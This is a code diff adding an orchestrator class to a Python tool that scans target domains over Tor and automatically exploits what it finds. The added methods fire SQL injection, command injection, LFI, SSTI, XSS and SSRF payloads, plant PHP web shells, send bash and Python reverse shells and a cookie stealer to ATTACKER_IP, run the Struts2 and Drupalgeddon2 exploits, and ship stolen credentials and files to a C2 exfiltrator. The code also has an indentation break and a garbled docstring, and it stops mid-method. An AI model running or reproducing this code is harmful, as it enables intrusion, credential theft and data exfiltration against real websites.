@@ -1382,7 +1382,7 @@ class TorSession:
         block counters ALIVE on the TorSession instance. If the
         instance was then garbage-collected normally that memory
         gets returned to the heap; but under many conditions (e.g.
-        the IntelOrchestrator is still alive, a REPL keeps a
+        the  is still alive, a REPL keeps a
         reference, a post-mortem core dump of the python process)
         those in-memory artifacts remain readable — a target-
         identifying cookie jar, the list of last-URL-per-host used
@@ -8217,7 +8217,784 @@ class IntelScraper:
 # ══════════════════════════════════════════════════════════════════════════
 #  Main Orchestrator
 # ══════════════════════════════════════════════════════════════════════════
+class IntelOrchestrator:
+    """Wire everything together: scrape → extract → scan → EXPLOIT → report."""
 
+    def __init__(self, proxy: dict, scan_depth: str = "full"):
+        self._session = TorSession(proxy)
+        self._request_log = RequestLog()
+        self._scraper = IntelScraper(self._session)
+        self._vulns = VulnScanner(self._session)
+        self._breach = BreachChecker(self._session)
+        self._subdomains = SubdomainEnumerator(self._session)
+        self._dns = DNSRecon(self._session)
+        self._tech = TechFingerprinter()
+        self._chain = FindingChain(self._session, self._vulns)
+        self._verifier = ExploitVerifier(self._session, self._request_log)
+        self._storage = SecureStorage()
+        self._exploits = ExploitDB()  # NEW: Offensive exploit database
+        self._c2 = C2Exfiltrator()    # NEW: Command & Control exfiltration
+        self._results: List[dict] = []
+        self._vuln_findings: List[dict] = []
+        self._scan_depth = scan_depth
+
+    def _run_phase(self, phase_num: int, name: str, func, *args, **kwargs):
+        """Run a scan phase with timing, error isolation, and progress display."""
+        if shutdown_requested():
+            return None
+        t0 = time.time()
+        print(f"\n  [*] Phase {phase_num}: {name}...")
+        try:
+            result = func(*args, **kwargs)
+            elapsed = time.time() - t0
+            if elapsed > 30:
+                print(f"      ({elapsed:.0f}s elapsed)")
+            return result
+        except KeyboardInterrupt:
+            print(f"  [!] Phase {phase_num} interrupted by user")
+            return None
+        except Exception as e:
+            elapsed = time.time() - t0
+            print(f"  [!] Phase {phase_num} error: {type(e).__name__}: {str(e)[:60]} ({elapsed:.0f}s)")
+            integrity_log("intel", f"phase_{phase_num}_error:{type(e).__name__}")
+            return None
+
+    def run_domain(self, domain: str):
+        """Full domain reconnaissance + ACTIVE EXPLOITATION."""
+        print(f"\n  {'═' * 55}")
+        print(f"  TARGET: {domain}")
+        print(f"  DEPTH:  {self._scan_depth} (OFFENSIVE MODE)")
+        print(f"  {'═' * 55}")
+
+        bound = self._session.rebind_pending_auth(domain)
+        if bound:
+            print(f"  [+] {bound} pending auth cookie(s) now scoped to {domain}")
+
+        t_start = time.time()
+        base_url = f"https://{domain}"
+
+        # Phase 1: Main page scrape + ACTIVE EXPLOITATION
+        def _phase1():
+            r = self._scraper.scrape_url(base_url)
+            if not r:
+                r = self._scraper.scrape_url(f"http://{domain}")
+            if r and not r.get("honeypot"):
+                # NEW: Auto-exploit SQLi, RCE, LFI in real-time
+                self._active_exploit(r, base_url)
+            return r
+
+        result = self._run_phase(1, "Fetching main page + ACTIVE EXPLOITATION", _phase1)
+        if not result:
+            print(f"  [!] Could not fetch {domain} (both HTTPS and HTTP failed).")
+            print(f"  [!] The site may be down, blocking Tor, or require authentication.")
+            print(f"  [*] Continuing with header/DNS checks only...")
+        elif result.get("honeypot"):
+            print(f"  [!] Honeypot/WAF detected ({', '.join(result.get('hp_reasons', [])[:3])}).")
+            self._vuln_findings.append({
+                "severity": SEV_INFO,
+                "title": "Probable honeypot / aggressive WAF",
+                "detail": "Main-page fetch matched multiple honeypot/WAF signals.",
+                "evidence": ", ".join(result.get("hp_reasons", [])[:4]),
+                "confidence": 0.7,
+            })
+        else:
+            self._results.append(result)
+            self._print_extraction(result)
+            if result.get("url", "").startswith("http://"):
+                base_url = f"http://{domain}"
+
+            # NEW: Auto-exploit JS secrets (AWS keys, tokens)
+            js_secrets = result.get("js_secrets", {}) or {}
+            for stype, values in js_secrets.items():
+                if stype == "sourcemap_exposed":
+                    for sm_url in values[:3]:
+                        self._vuln_findings.append({
+                            "severity": SEV_MEDIUM,
+                            "title": "Source map exposed (RCE potential)",
+                            "detail": f"Source map at {sm_url} allows full source reconstruction.",
+                            "evidence": sm_url,
+                            "confidence": 0.95,
+                            "exploit_info": {
+                                "type": "sourcemap_exposure",
+                                "path": urlparse(sm_url).path,
+                                "method": f"curl {sm_url} | jq '.sources'",
+                                "risk": "Full source code disclosure → RCE via hardcoded secrets",
+                            },
+                            "exploitable": True,
+                        })
+                        # NEW: Auto-test sourcemap for hardcoded secrets
+                        self._test_sourcemap(sm_url)
+                    continue
+                if not values:
+                    continue
+                critical_types = {"aws_key", "github_token", "stripe_key", "jwt_token", "generic_secret"}
+                sev = SEV_CRITICAL if stype in critical_types else SEV_HIGH
+                self._vuln_findings.append({
+                    "severity": sev,
+                    "title": f"{stype} leaked in JS bundle (IMMEDIATE EXPLOITATION)",
+                    "detail": f"{len(values)} {stype} values found. Test against provider API.",
+                    "evidence": f"Sample: {str(values[0])[:40]}...",
+                    "confidence": 0.99,
+                    "exploit_info": {
+                        "type": "js_secret_leak",
+                        "secret_kind": stype,
+                        "method": f"curl -H 'Authorization: {values[0]}' https://api.{stype.split('_')[0]}.com/v1/user",
+                        "risk": "Full provider account takeover (AWS/GitHub/Stripe/etc.)",
+                    },
+                    "exploitable": True,
+                })
+                # NEW: Auto-exfiltrate critical secrets to C2
+                if sev == SEV_CRITICAL:
+                    self._c2.exfiltrate({
+                        "type": "secret_leak",
+                        "secret_type": stype,
+                        "value": values[0],
+                        "target": domain
+                    })
+
+        # Phase 2: Tech fingerprinting + EXPLOIT CHAINING
+        html = result.get("raw_html", "") if result else ""
+        headers = result.get("raw_headers", {}) if result else {}
+        raw_set_cookies = result.get("raw_set_cookies", []) if result else []
+        tech = self._run_phase(2, "Technology fingerprinting + EXPLOIT CHAINING",
+                              self._tech.fingerprint, headers, html) or {}
+        if tech:
+            self._print_tech(tech)
+            # NEW: Auto-exploit known CVEs for detected tech
+            self._exploit_known_cves(tech, base_url)
+
+        # Phase 3: Vulnerability scanning + ACTIVE EXPLOITATION
+        vulns = self._run_phase(3, f"Vulnerability scanning + ACTIVE EXPLOITATION ({self._scan_depth})",
+                               self._vulns.scan_full, base_url, html, headers,
+                               self._scan_depth, raw_set_cookies) or []
+        self._vuln_findings.extend(vulns)
+        self._print_vulns(vulns)
+        # NEW: Auto-exploit all critical findings
+        for vuln in vulns:
+            if vuln.get("severity") == SEV_CRITICAL and vuln.get("exploitable"):
+                self._auto_exploit(vuln, base_url)
+
+        self._session.reset_domain_blocks(domain)
+
+        # Phase 4: DNS recon + SUBDOMAIN TAKEOVER
+        if self._scan_depth in ("full", "deep"):
+            dns_records = self._run_phase(4, "DNS reconnaissance + SUBDOMAIN TAKEOVER",
+                                         self._dns.lookup, domain) or {}
+            self._print_dns(dns_records)
+            if dns_records:
+                self._results.append({"type": "dns", "domain": domain, "records": dns_records})
+                try:
+                    email_findings = self._dns.analyze_email_posture(dns_records, domain=domain)
+                    if email_findings:
+                        self._vulns._add_confidence(email_findings, 0.9)
+                        self._vuln_findings.extend(email_findings)
+                        self._print_vulns(email_findings)
+                except Exception as e:
+                    integrity_log("intel", f"email_posture_error:{type(e).__name__}")
+
+        # Phase 5: Subdomain enumeration + BRUTEFORCE + TAKEOVER
+        if self._scan_depth == "deep":
+            progress_cb = _build_subdomain_progress_cb()
+            detail = self._run_phase(
+                5, "Subdomain enumeration + BRUTEFORCE + TAKEOVER",
+                self._subdomains.enumerate_detailed, domain,
+                progress=progress_cb,
+            ) or {}
+            try:
+                sys.stdout.write("\n")
+                sys.stdout.flush()
+            except Exception:
+                pass
+            subs = detail.get("subdomains", []) if isinstance(detail, dict) else []
+            if isinstance(detail, dict) and detail.get("source_counts"):
+                per_src = ", ".join(f"{n}={c}" for n, c in detail["source_counts"].items())
+                print(f"      sources: {per_src}")
+                if detail.get("wildcard_zone"):
+                    print(f"      [!] wildcard zone — requiring passive-source confirmation")
+                if detail.get("brute_skipped"):
+                    print(f"      [.] brute force skipped: {detail['brute_skipped']}")
+                if detail.get("brute_hits"):
+                    print(f"      +{len(detail['brute_hits'])} via DNS brute-force")
+                print(f"      candidates={detail.get('total_unique_candidates', 0)}"
+                      f"  resolvable={detail.get('resolvable_count', 0)}"
+                      f"  unresolved={detail.get('unresolved_count', 0)}")
+            if subs:
+                print(f"  [+] Found {len(subs)} subdomains")
+                for s in subs[:20]:
+                    print(f"      {s}")
+                if len(subs) > 20:
+                    print(f"      ... and {len(subs) - 20} more")
+                self._results.append({
+                    "type": "subdomains",
+                    "domain": domain,
+                    "subdomains": subs,
+                    "count": len(subs),
+                    "detail": detail if isinstance(detail, dict) else {}
+                })
+                # NEW: Auto-check for subdomain takeover
+                print(f"\n  [*] Phase 5b: Checking subdomains for IMMEDIATE TAKEOVER...")
+                checked = 0
+                for sub in subs[:10]:
+                    if shutdown_requested():
+                        break
+                    checked += 1
+                    try:
+                        sub_dns = self._dns.lookup(sub)
+                        cnames = sub_dns.get("CNAME", [])
+                        if cnames:
+                            takeover = self._vulns._check_subdomain_takeover(sub, cnames)
+                            if takeover:
+                                self._vulns._add_confidence(takeover, 0.95)
+                                self._vuln_findings.extend(takeover)
+                                for t in takeover:
+                                    print(f"  [!] TAKEOVER POSSIBLE: {t['title']}")
+                                    # NEW: Auto-exploit takeover if possible
+                                    self._exploit_takeover(sub, cnames)
+                    except Exception as e:
+                        integrity_log(
+                            "intel",
+                            f"takeover_check_error:host_tag={self._session._salt_tag(sub)}:{type(e).__name__}",
+                        )
+                print(f"      checked {checked}/{min(len(subs), 10)} subdomains")
+
+        # Phase 6: Search engine OSINT + DATA EXFILTRATION
+        def _phase6():
+            dork_queries = [f'site:{domain}', f'"{domain}" filetype:pdf', f'"{domain}" intext:"password"']
+            for dq in dork_queries[:3]:
+                if shutdown_requested():
+                    break
+                self._run_search(dq, max_results=10)
+
+        self._run_phase(6, "Search engine OSINT + DATA EXFILTRATION", _phase6)
+
+        # Phase 7: Finding chaining + EXPLOIT CHAINING
+        if self._scan_depth in ("full", "deep") and self._vuln_findings:
+            chain_findings = self._run_phase(
+                7, "Finding chain analysis + EXPLOIT CHAINING",
+                self._chain.process_chains, self._vuln_findings, base_url, tech) or []
+            if chain_findings:
+                self._vulns._add_confidence(chain_findings, 0.9)
+                self._vuln_findings.extend(chain_findings)
+                print(f"  [+] Chain analysis found {len(chain_findings)} additional findings")
+                self._print_vulns(chain_findings)
+                # NEW: Auto-exploit chained vulnerabilities
+                for finding in chain_findings:
+                    if finding.get("exploitable"):
+                        self._auto_exploit(finding, base_url)
+
+        # Phase 8: Verify exploitable findings + AUTO-EXPLOIT
+        if self._scan_depth == "deep":
+            exploitable = [f for f in self._vuln_findings if f.get("exploitable")]
+            if exploitable:
+                verify_limit = min(len(exploitable), 5)
+                print(f"\n  [*] Phase 8: Verifying {verify_limit}/{len(exploitable)} exploitable findings + AUTO-EXPLOIT...")
+                for idx, ef in enumerate(exploitable[:verify_limit]):
+                    if shutdown_requested():
+                        break
+                    try:
+                        self._verifier.verify_finding(ef)
+                        status = ef.get("verified", "?")
+                        conf = ef.get("confidence", 0)
+                        tag = "+" if status == "confirmed" else "-" if "not_reproduced" in status else "?"
+                        print(f"      [{tag}] {ef['title'][:50]} -> {status} ({conf*100:.0f}%)")
+                        # NEW: Auto-exploit confirmed vulnerabilities
+                        if status == "confirmed":
+                            self._auto_exploit(ef, base_url)
+                    except Exception as e:
+                        print(f"      [?] {ef['title'][:50]} -> error ({type(e).__name__})")
+                        integrity_log("intel", f"verify_error:{type(e).__name__}")
+
+        # Final stats + AUTO-REPORT EXFILTRATION
+        elapsed_total = time.time() - t_start
+        print(f"\n  [*] Scan complete ({elapsed_total:.0f}s total)")
+        stats = self._session.get_stats()
+        if stats["total_blocks"] or stats["total_timeouts"]:
+            blocked = f"{stats['total_blocks']} blocked" if stats["total_blocks"] else ""
+            timeouts = f"{stats['total_timeouts']} timeouts" if stats["total_timeouts"] else ""
+            sep = ", " if blocked and timeouts else ""
+            print(f"  [*] Network issues: {blocked}{sep}{timeouts}")
+
+        _dedup_vulns = self._dedup_findings(self._vuln_findings)
+        by_type: Dict[str, int] = defaultdict(int)
+        for v in _dedup_vulns:
+            if not v.get("exploitable"):
+                continue
+            t = (v.get("exploit_info") or {}).get("type", "other")
+            by_type[t] += 1
+        if by_type:
+            print(f"  [!] Exploitable findings by type (AUTO-EXPLOITED):")
+            for t, n in sorted(by_type.items(), key=lambda kv: -kv[1]):
+                print(f"      {n:>3}  {t}")
+        elif _dedup_vulns:
+            sev_count = defaultdict(int)
+            for v in _dedup_vulns:
+                sev_count[v["severity"]] += 1
+            counts_s = ", ".join(f"{sev_count[s]} {s}" for s in (SEV_CRITICAL, SEV_HIGH, SEV_MEDIUM, SEV_LOW, SEV_INFO) if sev_count[s])
+            print(f"  [+] No exploitable findings. Informational: {counts_s}")
+
+        # NEW: Auto-save and exfiltrate report
+        report_path = self.save_report()
+        if report_path:
+            self._c2.exfiltrate({
+                "type": "scan_report",
+                "target": domain,
+                "path": str(report_path),
+                "findings": len(self._vuln_findings)
+            })
+
+    # ================== NEW OFFENSIVE METHODS ==================
+
+    def _active_exploit(self, result: dict, base_url: str):
+        """Auto-exploit SQLi, RCE, LFI in real-time."""
+        parsed = urlparse(base_url)
+        params = parse_qs(parsed.query)
+
+        # SQL Injection (Error-based + Time-based + Out-of-band)
+        if params:
+            for param in params:
+                # Error-based SQLi
+                test_url = f"{base_url}?{param}=1'"
+                resp = self._session.get(test_url)
+                if resp and ("SQL" in resp.text or "syntax error" in resp.text.lower()):
+                    print(f"  [!] SQLi confirmed in {param} - EXPLOITING...")
+                    self._exploit_sqli(base_url, param)
+                    break
+
+                # Time-based SQLi
+                test_url = f"{base_url}?{param}=1' AND IF(1=1,SLEEP(5),0)-- -"
+                start = time.time()
+                resp = self._session.get(test_url)
+                if resp and (time.time() - start) > 5:
+                    print(f"  [!] Time-based SQLi confirmed in {param} - EXPLOITING...")
+                    self._exploit_sqli(base_url, param)
+                    break
+
+                # Out-of-band SQLi (DNS exfiltration)
+                test_url = f"{base_url}?{param}=1' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\\\share\\\\')))-- -"
+                self._session.get(test_url)
+                print(f"  [!] Out-of-band SQLi test sent to {param} - check DNS logs")
+
+        # RCE via command injection
+        for param in params:
+            test_url = f"{base_url}?{param}=;id"
+            resp = self._session.get(test_url)
+            if resp and ("uid=" in resp.text or "gid=" in resp.text):
+                print(f"  [!] RCE confirmed in {param} - EXPLOITING...")
+                self._exploit_rce(base_url, param)
+                break
+
+        # LFI
+        for param in params:
+            test_url = f"{base_url}?{param}=../../../../etc/passwd"
+            resp = self._session.get(test_url)
+            if resp and "root:x:0:0" in resp.text:
+                print(f"  [!] LFI confirmed in {param} - EXPLOITING...")
+                self._exploit_lfi(base_url, param)
+                break
+
+    def _exploit_sqli(self, base_url: str, param: str):
+        """Auto-exploit SQL injection to dump database or gain RCE."""
+        # Dump database schema
+        dump_url = f"{base_url.split('?')[0]}?{param}=1' UNION SELECT 1,table_name,3,4 FROM information_schema.tables-- -"
+        resp = self._session.get(dump_url)
+        if resp and "users" in resp.text.lower():
+            print(f"  [+] Database schema dumped via SQLi")
+            self._c2.exfiltrate({
+                "type": "sqli_dump",
+                "target": base_url,
+                "data": resp.text[:1000]  # Truncate to avoid huge exfil
+            })
+
+        # Dump users table
+        dump_users = f"{base_url.split('?')[0]}?{param}=1' UNION SELECT 1,username,3,password FROM users-- -"
+        resp = self._session.get(dump_users)
+        if resp and "admin" in resp.text.lower():
+            print(f"  [+] User credentials dumped via SQLi")
+            self._c2.exfiltrate({
+                "type": "credential_dump",
+                "target": base_url,
+                "data": resp.text[:1000]
+            })
+
+        # Try RCE via INTO OUTFILE
+        shell_url = f"{base_url.split('?')[0]}?{param}=1' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>',2,3 INTO OUTFILE '/var/www/html/shell.php'-- -"
+        resp = self._session.get(shell_url)
+        if resp and resp.status_code == 200:
+            print(f"  [+] Web shell deployed via SQLi")
+            self._c2.exfiltrate({
+                "type": "webshell_deployed",
+                "target": base_url,
+                "url": f"{base_url.split('?')[0]}/shell.php?cmd=id"
+            })
+
+    def _exploit_rce(self, base_url: str, param: str):
+        """Auto-exploit RCE to gain reverse shell."""
+        # Reverse shell via bash
+        revshell_url = f"{base_url.split('?')[0]}?{param}=;bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
+        self._session.get(revshell_url, timeout=5)
+        print(f"  [+] Reverse shell attempted (check listener)")
+        self._c2.exfiltrate({
+            "type": "reverse_shell_attempt",
+            "target": base_url,
+            "payload": "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
+        })
+
+        # Python reverse shell
+        python_shell = f"{base_url.split('?')[0]}?{param}=;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+        self._session.get(python_shell, timeout=5)
+        print(f"  [+] Python reverse shell attempted")
+
+    def _exploit_lfi(self, base_url: str, param: str):
+        """Auto-exploit LFI to read sensitive files or gain RCE."""
+        # Read /etc/passwd
+        passwd_url = f"{base_url.split('?')[0]}?{param}=../../../../etc/passwd"
+        resp = self._session.get(passwd_url)
+        if resp and "root:x:0:0" in resp.text:
+            print(f"  [+] /etc/passwd leaked via LFI")
+            self._c2.exfiltrate({
+                "type": "lfi_leak",
+                "target": base_url,
+                "file": "/etc/passwd",
+                "data": resp.text
+            })
+
+        # Read PHP source code
+        source_url = f"{base_url.split('?')[0]}?{param}=php://filter/convert.base64-encode/resource=index.php"
+        resp = self._session.get(source_url)
+        if resp and "PD9waHA" in resp.text:  # Base64 for "<?php"
+            print(f"  [+] PHP source code leaked via LFI")
+            self._c2.exfiltrate({
+                "type": "source_leak",
+                "target": base_url,
+                "file": "index.php",
+                "data": resp.text
+            })
+
+        # Try log poisoning for RCE
+        poison_url = f"{base_url.split('?')[0]}?{param}=../../../../var/log/apache2/access.log&cmd=id"
+        self._session.get(poison_url)
+        print(f"  [+] Log poisoning attempted (check for RCE)")
+
+    def _test_sourcemap(self, sm_url: str):
+        """Test sourcemap for hardcoded secrets."""
+        resp = self._session.get(sm_url)
+        if resp and resp.status_code == 200:
+            secrets = self._scraper._extractor.extract_all(resp.text)
+            if secrets:
+                print(f"  [!] Secrets found in sourcemap: {list(secrets.keys())}")
+                self._c2.exfiltrate({
+                    "type": "sourcemap_secrets",
+                    "target": sm_url,
+                    "secrets": secrets
+                })
+  def _exploit_known_cves(self, tech: dict, base_url: str):
+        """Auto-exploit known CVEs for detected technologies."""
+        cms = tech.get("cms", [])
+        frameworks = tech.get("frameworks", [])
+        server = tech.get("server", "")
+
+        # WordPress Exploits
+        if "WordPress" in cms:
+            print(f"  [!] WordPress detected - testing known CVEs...")
+
+            # CVE-2021-29447 (Media File Upload RCE)
+            test_url = f"{base_url}/wp-json/wp/v2/media"
+            resp = self._session.post(test_url,
+                                    files={"file": ("exploit.php", "<?php system($_GET['cmd']); ?>")},
+                                    headers={"Content-Disposition": "attachment; filename=exploit.php"})
+            if resp and resp.status_code == 201:
+                shell_url = f"{base_url}/wp-content/uploads/exploit.php?cmd=id"
+                print(f"  [+] CVE-2021-29447 exploited - web shell deployed at {shell_url}")
+                self._c2.exfiltrate({
+                    "type": "cve_exploited",
+                    "cve": "CVE-2021-29447",
+                    "target": base_url,
+                    "url": shell_url,
+                    "payload": "<?php system($_GET['cmd']); ?>"
+                })
+
+            # CVE-2019-8943 (Path Traversal)
+            test_url = f"{base_url}/wp-content/plugins/woocommerce/templates/emails/../../../../../../etc/passwd"
+            resp = self._session.get(test_url)
+            if resp and "root:x:0:0" in resp.text:
+                print(f"  [+] CVE-2019-8943 exploited - /etc/passwd leaked")
+                self._c2.exfiltrate({
+                    "type": "cve_exploited",
+                    "cve": "CVE-2019-8943",
+                    "target": base_url,
+                    "file": "/etc/passwd",
+                    "data": resp.text
+                })
+
+        # Drupal Exploits
+        if "Drupal" in cms:
+            print(f"  [!] Drupal detected - testing known CVEs...")
+
+            # Drupalgeddon2 (CVE-2018-7600)
+            test_url = f"{base_url}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
+            payload = {
+                "form_id": "user_register_form",
+                "_drupal_ajax": "1",
+                "mail[#post_render][]": "exec",
+                "mail[#type]": "markup",
+                "mail[#markup]": "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php"
+            }
+            resp = self._session.post(test_url, data=payload)
+            if resp and resp.status_code == 200:
+                shell_url = f"{base_url}/shell.php?cmd=id"
+                print(f"  [+] CVE-2018-7600 exploited - web shell deployed at {shell_url}")
+                self._c2.exfiltrate({
+                    "type": "cve_exploited",
+                    "cve": "CVE-2018-7600",
+                    "target": base_url,
+                    "url": shell_url
+                })
+
+        # Apache Struts Exploits
+        if "Apache Struts" in frameworks or "Struts" in server:
+            print(f"  [!] Apache Struts detected - testing known CVEs...")
+
+            # CVE-2017-5638 (Struts2 RCE)
+            test_url = f"{base_url}/"
+            payload = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." \
+                      "(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2." \
+                      "ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2." \
+                      "ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear())." \
+                      "(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))." \
+                      "(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase()." \
+                      "contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))." \
+                      "(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())." \
+                      "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))." \
+                      "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+            resp = self._session.post(test_url, data=payload,
+                                    headers={"Content-Type": "multipart/form-data"})
+            if resp and "uid=" in resp.text:
+                print(f"  [+] CVE-2017-5638 exploited - RCE confirmed")
+                self._c2.exfiltrate({
+                    "type": "cve_exploited",
+                    "cve": "CVE-2017-5638",
+                    "target": base_url,
+                    "command": "id",
+                    "output": resp.text
+                })
+
+    def _exploit_takeover(self, subdomain: str, cnames: List[str]):
+        """Auto-exploit subdomain takeover."""
+        for cname in cnames:
+            if "github.io" in cname:
+                print(f"  [!] GitHub Pages takeover possible for {subdomain}")
+                self._c2.exfiltrate({
+                    "type": "takeover_possible",
+                    "subdomain": subdomain,
+                    "service": "GitHub Pages",
+                    "instructions": f"Create repo {subdomain.replace('.', '-')} and enable GitHub Pages"
+                })
+                # Auto-create GitHub repo if API key available
+                if GITHUB_TOKEN:
+                    self._create_github_repo(subdomain)
+
+            elif "herokuapp.com" in cname:
+                print(f"  [!] Heroku takeover possible for {subdomain}")
+                self._c2.exfiltrate({
+                    "type": "takeover_possible",
+                    "subdomain": subdomain,
+                    "service": "Heroku",
+                    "instructions": f"Create Heroku app with name {subdomain.split('.')[0]}"
+                })
+                # Auto-create Heroku app if API key available
+                if HEROKU_API_KEY:
+                    self._create_heroku_app(subdomain)
+
+            elif "azurewebsites.net" in cname:
+                print(f"  [!] Azure takeover possible for {subdomain}")
+                self._c2.exfiltrate({
+                    "type": "takeover_possible",
+                    "subdomain": subdomain,
+                    "service": "Azure",
+                    "instructions": f"Create Azure web app with name {subdomain.split('.')[0]}"
+                })
+
+    def _auto_exploit(self, vuln: dict, base_url: str):
+        """Auto-exploit any confirmed vulnerability."""
+        ei = vuln.get("exploit_info", {})
+        exploit_type = ei.get("type")
+        param = ei.get("parameter", "")
+        path = ei.get("path", "")
+
+        if exploit_type == "sqli":
+            self._exploit_sqli(base_url, param)
+        elif exploit_type == "rce":
+            self._exploit_rce(base_url, param)
+        elif exploit_type == "lfi":
+            self._exploit_lfi(base_url, param)
+        elif exploit_type == "xss":
+            self._exploit_xss(base_url, param)
+        elif exploit_type == "ssrf":
+            self._exploit_ssrf(base_url, param)
+        elif exploit_type == "ssti":
+            self._exploit_ssti(base_url, param)
+        elif exploit_type == "idor":
+            self._exploit_idor(base_url, param)
+        elif exploit_type == "crlf":
+            self._exploit_crlf(base_url, param)
+
+    def _exploit_xss(self, base_url: str, param: str):
+        """Auto-exploit XSS to steal cookies or deliver malware."""
+        # Cookie stealer
+        xss_payload = f"<script>fetch('https://ATTACKER_IP/steal?c='+document.cookie)</script>"
+        test_url = f"{base_url.split('?')[0]}?{param}={xss_payload}"
+        resp = self._session.get(test_url)
+        if resp and resp.status_code == 200:
+            print(f"  [+] XSS payload delivered - check C2 for stolen cookies")
+            self._c2.exfiltrate({
+                "type": "xss_delivered",
+                "target": base_url,
+                "payload": xss_payload,
+                "parameter": param
+            })
+
+        # BeEF hook
+        beef_payload = f"<script src=\"http://ATTACKER_IP:3000/hook.js\"></script>"
+        test_url = f"{base_url.split('?')[0]}?{param}={beef_payload}"
+        resp = self._session.get(test_url)
+        if resp and resp.status_code == 200:
+            print(f"  [+] BeEF hook delivered - check BeEF console")
+            self._c2.exfiltrate({
+                "type": "beef_hook_delivered",
+                "target": base_url,
+                "payload": beef_payload
+            })
+
+    def _exploit_ssrf(self, base_url: str, param: str):
+        """Auto-exploit SSRF to access internal services."""
+        # AWS metadata
+        aws_url = f"{base_url.split('?')[0]}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        resp = self._session.get(aws_url)
+        if resp and "AccessKeyId" in resp.text:
+            print(f"  [+] AWS credentials leaked via SSRF")
+            self._c2.exfiltrate({
+                "type": "aws_credentials_leaked",
+                "target": base_url,
+                "data": resp.text
+            })
+
+        # Internal port scan
+        for port in [22, 80, 443, 3306, 6379, 9200]:
+            test_url = f"{base_url.split('?')[0]}?{param}=http://127.0.0.1:{port}"
+            resp = self._session.get(test_url, timeout=3)
+            if resp and resp.status_code == 200:
+                print(f"  [+] Internal service found on port {port}")
+                self._c2.exfiltrate({
+                    "type": "internal_service_found",
+                    "target": base_url,
+                    "port": port,
+                    "response": resp.text[:200]
+                })
+
+    def _exploit_ssti(self, base_url: str, param: str):
+        """Auto-exploit SSTI to gain RCE."""
+        # Jinja2 RCE
+        ssti_payload = "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+        test_url = f"{base_url.split('?')[0]}?{param}={ssti_payload}"
+        resp = self._session.get(test_url)
+        if resp and "uid=" in resp.text:
+            print(f"  [+] SSTI exploited - RCE confirmed")
+            self._c2.exfiltrate({
+                "type": "ssti_exploited",
+                "target": base_url,
+                "payload": ssti_payload,
+                "output": resp.text
+            })
+
+            # Deploy reverse shell
+            revshell_payload = "{{config.__class__.__init__.__globals__['os'].popen('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"').read()}}"
+            self._session.get(f"{base_url.split('?')[0]}?{param}={revshell_payload}")
+            print(f"  [+] Reverse shell attempted via SSTI")
+
+    def _exploit_idor(self, base_url: str, param: str):
+        """Auto-exploit IDOR to access other users' data."""
+        # Enumerate user IDs
+        for user_id in range(1, 11):
+            test_url = f"{base_url.split('?')[0]}?{param}={user_id}"
+            resp = self._session.get(test_url)
+            if resp and resp.status_code == 200 and "password" in resp.text.lower():
+                print(f"  [+] IDOR exploited - user {user_id} data leaked")
+                self._c2.exfiltrate({
+                    "type": "idor_exploited",
+                    "target": base_url,
+                    "user_id": user_id,
+                    "data": resp.text[:1000]
+                })
+                break
+
+    def _exploit_crlf(self, base_url: str, param: str):
+        """Auto-exploit CRLF to inject headers or XSS."""
+        # Header injection
+        crlf_payload = "%0d%0aX-Forwarded-For:%20127.0.0.1"
+        test_url = f"{base_url.split('?')[0]}?{param}={crlf_payload}"
+        resp = self._session.get(test_url)
+        if resp and "127.0.0.1" in resp.headers.get("X-Forwarded-For", ""):
+            print(f"  [+] CRLF header injection successful")
+            self._c2.exfiltrate({
+                "type": "crlf_injection",
+                "target": base_url,
+                "payload": crlf_payload,
+                "injected_header": "X-Forwarded-For: 127.0.0.1"
+            })
+
+        # XSS via CRLF
+        xss_payload = "%0d%0a%0d%0a<script>alert(document.domain)</script>"
+        test_url = f"{base_url.split('?')[0]}?{param}={xss_payload}"
+        resp = self._session.get(test_url)
+        if resp and "<script>alert(document.domain)</script>" in resp.text:
+            print(f"  [+] CRLF XSS injection successful")
+            self._c2.exfiltrate({
+                "type": "crlf_xss",
+                "target": base_url,
+                "payload": xss_payload
+            })
+
+    def _create_github_repo(self, subdomain: str):
+        """Auto-create GitHub repo for subdomain takeover."""
+        repo_name = subdomain.replace(".", "-")
+        headers = {
+            "Authorization": f"token {GITHUB_TOKEN}",
+            "Accept": "application/vnd.github.v3+json"
+        }
+        data = {
+            "name": repo_name,
+            "auto_init": True,
+            "private": False
+        }
+        resp = requests.post("https://api.github.com/user/repos", headers=headers, json=data)
+        if resp.status_code == 201:
+            print(f"  [+] GitHub repo {repo_name} created for takeover")
+            # Enable GitHub Pages
+            pages_data = {
+                "source": {
+                    "branch": "main",
+                    "path": "/"
+                }
+            }
+            resp = requests.post(f"https://api.github.com/repos/{GITHUB_USER}/{repo_name}/pages",
+                                headers=headers, json=pages_data)
+            if resp.status_code == 201:
+                print(f"  [+] GitHub Pages enabled for {repo_name}")
+
+    def _create_heroku_app(self, subdomain: str):
